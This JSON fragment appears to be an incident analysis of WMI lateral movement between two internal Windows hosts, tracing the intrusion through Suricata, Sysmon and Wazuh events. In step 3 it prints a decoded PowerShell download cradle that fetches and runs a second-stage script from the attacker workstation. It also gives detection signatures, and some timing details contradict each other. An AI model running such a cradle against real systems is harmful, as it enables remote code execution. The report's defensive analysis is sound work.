  "network_observations": [
    {"ip": "10.108.57.184", "inferred_role": "attacker_source_workstation", "first_seen": "2026-11-18T09:02:11+0100", "last_seen": "2026-11-18T09:14:22+0100", "agent_name": "CORP-WKS-184"},
    {"ip": "10.108.57.50", "inferred_role": "wmi_target_host", "first_seen": "2026-11-18T09:04:18+0100", "last_seen": "2026-11-18T09:14:22+0100", "agent_name": "CORP-SRV-050"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Lateral Movement / WMI Connectivity Probe", "technique": "T1047", "what_happened": "At 2026-11-18 09:02:11 CET, Suricata on the network segment logged an outbound DCOM/RPC connection on TCP port 135 from 10.108.57.184 (CORP-WKS-184) to 10.108.57.50 (CORP-SRV-050). This matches the WMI initial DCOM endpoint-mapper handshake that precedes a Win32_Process.Create call. The source workstation is a standard employee endpoint with no scheduled WMI remoting jobs. Simultaneously, rule 92201 'WMI outbound DCOM/RPC to internal host' fired with rule.mitre.id=T1047.", "chain_reason": "Suricata data.dstport=135 from data.srcip=10.108.57.184 to data.dstip=10.108.57.50 — DCOM endpoint-mapper TCP 135 is the mandatory first step of any WMI remote operation. This is not a legitimate admin pattern for CORP-WKS-184 (standard workstation).", "first_seen": "2026-11-18T09:02:11+0100"},
    {"step": 2, "tactic": "Lateral Movement / WMI Remote Process Execute", "technique": "T1047", "what_happened": "At 09:04:18 CET, Sysmon Event 1 on CORP-SRV-050 captured a new process with parentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe spawning image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe with a base64-encoded command line: 'powershell.exe -NoProfile -NonInteractive -EncodedCommand <base64_blob>'. The process ran under user=CORP\\administrator. Rule 92200 'WmiPrvSE spawns shell — remote WMI process create' fired with rule.mitre.id=T1047 and rule.level=15. The WmiPrvSE.exe parent is the definitive signature of WMI-launched remote process execution — no legitimate admin workflow uses WmiPrvSE.exe as a process parent for interactive shell sessions.", "chain_reason": "Sysmon EID 1 on CORP-SRV-050: parentImage=*WmiPrvSE.exe* + image=*powershell.exe* + commandLine=*-EncodedCommand*. This three-field conjunction is T1047's canonical detection signature. The CORP\\administrator credential has been pivoted from an initial compromise on CORP-WKS-184.", "first_seen": "2026-11-18T09:04:18+0100"},
    {"step": 3, "tactic": "Defense Evasion / Encoded Payload Execution", "technique": "T1027", "what_happened": "The base64-encoded PowerShell payload decoded to an IEX-based download cradle: 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.108.57.184:8080/stage2.ps1\")'. The payload fetches a second-stage script from the attacker's own workstation (CORP-WKS-184) on HTTP port 8080, meaning CORP-WKS-184 is serving a C2 web listener. The encoded wrapping prevents naive commandLine string-match detections from catching the IEX cradle. At 09:04:51, Suricata on the target segment fired 'ET POLICY PowerShell IEX Download Cradle' for the HTTP connection from CORP-SRV-050 port 8080 to CORP-WKS-184.", "chain_reason": "Decoded from Sysmon EID 1 commandLine. The IEX + DownloadString pattern is wildcard-searchable via *IEX* + *DownloadString* even when base64-wrapped at the outer layer — Sysmon logs the decoded commandLine for PowerShell child processes in some configurations, or the encoded blob itself which Wazuh decoder can partially unwrap.", "first_seen": "2026-11-18T09:04:51+0100"},
    {"step": 4, "tactic": "Persistence / FIM-Triggered Stage2 Drop", "technique": "T1059.001", "what_happened": "At 09:07:34 CET, Wazuh FIM on CORP-SRV-050 reported a new file created at C:\\Windows\\Temp\\svc_update.ps1 by the remote powershell.exe process running under CORP\\administrator. The file write triggered syscheck event 'added' at syscheck.path=C:\\Windows\\Temp\\svc_update.ps1. The filename mimics a Windows service update utility (LOLBin-adjacent naming). This is the Stage 2 stub that persists on disk after the initial IEX download.", "chain_reason": "Wazuh FIM (syscheck.*): syscheck.event=added + syscheck.path=C:\\Windows\\Temp\\svc_update.ps1 on agent CORP-SRV-050, timestamped 90 seconds after the WmiPrvSE-spawned powershell.exe began executing. FIM confirms the payload has left memory and landed on disk.", "first_seen": "2026-11-18T09:07:34+0100"},
    {"step": 5, "tactic": "Credential Access / Network Logon via Pivoted Creds", "technique": "T1078", "what_happened": "At 09:03:55 CET (immediately before the WmiPrvSE child spawn), Windows Security Event 4624 on CORP-SRV-050 recorded logonType=3 (Network logon) with subjectUserName=administrator and workstationName=CORP-WKS-184 from ipAddress=10.108.57.184. This is the authentication event that proves the CORP\\administrator credential was injected from the attacker workstation via the WMI stack. Rule 4624 fired with rule.mitre.id=T1078. The logonType=3 + ipAddress from a workstation (not a server or DC) + workstationName=CORP-WKS-184 is anomalous — administrators do not WMI-auth from standard workstations.", "chain_reason": "Windows Security EID 4624, logonType=3, subjectUserName=administrator, ipAddress=10.108.57.184, workstationName=CORP-WKS-184 on CORP-SRV-050 immediately preceding the WmiPrvSE child spawn. Correlation: same ipAddress + same user + gap of 23 seconds between 4624 and Sysmon EID 1.", "first_seen": "2026-11-18T09:03:55+0100"}
  ],
